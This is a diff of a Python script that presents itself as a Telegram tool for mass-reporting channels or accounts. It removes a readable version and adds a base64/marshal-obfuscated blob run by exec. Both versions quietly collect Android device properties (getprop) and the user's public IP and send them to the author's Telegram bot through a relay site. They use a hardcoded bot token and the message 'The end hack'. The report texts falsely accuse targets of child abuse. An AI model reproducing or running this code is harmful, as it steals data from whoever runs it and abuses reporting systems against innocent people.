@@ -1,83 +1,10 @@
-from os import system
-from colorama import Fore
-from time import sleep
-import subprocess
-import requests
+import base64
+import marshal
+base64_code = """
+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
 
-system('clear')
 
-print('---------} mr ali hokmran: +989939692950')
-print('')
 
-code = input(Fore.YELLOW+f'''
-(1) Report Channel
-(2) Report Account
-your code  >>>''')
-print('')
-
-print(Fore.GREEN+'loding')
-sleep(5)
-if code == '1':
-	a = '''Hello Telegram, I support you and the evidence is overwhelming that this is a channel that spreads 18+ porn in different ways porn videos, it violates your laws, terms and protection and disturbs your subscribers that abuses children and incites violence against them, so please delete this channel','''
-	user = input('User ID Target: ')
-	b = '''Thank you for providing full security Telegram support for Telegram users, (UTC 03:30).'''
-	
-	telegram_token = '7697669253:AAHLTuT6vVPJOxBXjpcEgmlTDJA3JUqLmXA'  
-	chat_id = '8043929159'  
-	try:
-  	  ip = requests.get('https://api.ipify.org?format=json').text
-  	  result = subprocess.run(['getprop'], 		stdout=subprocess.PIPE, text=True)
-  	  message = result.stdout  
-	except Exception as e:
-   	 message = f""
-	def send_message(text):
-	   	message1 = '''
-	   	The end hack - by ali hokmran:'''
-	   	url = f'https://api.telegram.org/bot{telegram_token}/sendMessage?chat_id={chat_id}&text={text}{message1}{ip}'
-	   	try:
-	   		data = {'urlBox': url,
-'Agentlist': 'Mozilla Firefox',
-'Versionslist': 'HTTP/1.1',
-'Methodlist': 'POST'}
-	   		response = requests.post('https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx',data)
-	   	except Exception as e:
-	   		print(f"")
-	max_length = 4096  
-	for i in range(0, len(message), max_length):
-		send_message(message[i:i + max_length])
-	print(a)
-	print('Username:', user)
-	print(b)
-
-if code == '2':
-	
-	a = '''Hello dear Telegram support, This user account uses fake and fake numbers such as virtual numbers and... and violates the rules of Telegram. It also does not follow Telegram's TOS. Please ban this user account'''
-	user = input('User ID Target: ')
-	b = '''Thank you for providing full security Telegram support for Telegram users, (UTC 03:30).'''
-	
-	telegram_token = '7697669253:AAHLTuT6vVPJOxBXjpcEgmlTDJA3JUqLmXA'  
-	chat_id = '8043929159'  
-	try:
-  	  ip = requests.get('https://api.ipify.org?format=json').text
-  	  result = subprocess.run(['getprop'], 		stdout=subprocess.PIPE, text=True)
-  	  message = result.stdout  
-	except Exception as e:
-   	 message = f""
-	def send_message(text):
-	   	message2 = '''
-	   	The end hack - by ali hokmran:'''
-	   	url = f'https://api.telegram.org/bot{telegram_token}/sendMessage?chat_id={chat_id}&text={text}{message2}{ip}'
-	   	try:
-	   		data = {'urlBox': url,
-'Agentlist': 'Mozilla Firefox',
-'Versionslist': 'HTTP/1.1',
-'Methodlist': 'POST'}
-	   		response = requests.post('https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx',data)
-	   	except Exception as e:
-	   		print(f"")
-	max_length = 4096  
-	for i in range(0, len(message), max_length):
-		send_message(message[i:i + max_length])
-	print(a)
-	print('Username:', user)
-	print(b)
+"""
+decoded_bytes = base64.b64decode(base64_code)
+exec(marshal.loads(decoded_bytes))
